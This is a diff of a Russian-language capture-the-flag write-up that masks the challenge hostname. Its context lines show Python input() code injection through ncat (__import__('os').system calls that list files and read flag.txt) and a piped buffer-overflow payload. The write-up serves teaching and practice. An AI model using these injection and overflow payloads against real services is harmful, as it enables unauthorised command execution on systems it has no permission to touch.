@@ -3,7 +3,7 @@
 
 Пользователю дан исходный код сервиса:
 >print 'SuperCalc: '  
-print(input())
+print (input())
 
 
 Те, кто программируют на языке Python, знают опасность функции  
@@ -14,7 +14,7 @@ print(input())
 
 
 Следовательно, можем ее эксплуатировать.  
->$ ncat n00bs.ml 13376  
+>$ ncat n****.ml 13376  
 $ __import__(‘os’).system(‘ls’)  
 $ __import__(‘os’).system(‘cat flag.txt’)
 
@@ -151,4 +151,4 @@ End of assembler dump.
 
 Проще всего это сделать следующим образом:
 
->```python -c "print 'a'*16 + '\x05'" | ncat n00bs.ml 13377```
+>```python -c "print 'a'*16 + '\x05'" | ncat n****.ml 13377```
